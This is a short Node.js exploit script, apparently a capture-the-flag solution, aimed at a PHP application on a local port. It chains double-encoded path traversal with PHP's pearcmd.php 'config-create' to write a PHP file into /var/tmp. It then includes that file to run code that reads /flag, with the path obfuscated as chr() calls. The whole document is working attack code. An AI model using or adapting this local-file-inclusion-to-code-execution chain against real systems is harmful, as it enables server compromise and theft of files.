const http = require("node:http");
function post(path, body) {
  return new Promise(resolve => {
    const req = http.request({hostname: "127.0.0.1", port: 8091, method: "POST", path, headers: {"Content-Type": "application/x-www-form-urlencoded", "Content-Length": Buffer.byteLength(body)}}, res => {
      res.on("data", chunk => process.stdout.write(chunk));
      res.on("end", resolve);
    });
    req.end(body);
  });
}
async function run() {
  await post("/?+config-create+/<?=file_get_contents(chr(47).chr(102).chr(108).chr(97).chr(103))?>+/var/tmp/stage.php", "page_id=1&pagename=templates%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fusr%252flocal%252flib%252fphp%252fpearcmd");
  await post("/", "page_id=1&pagename=templates%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fvar%252Ftmp%252Fstage");
}
run();
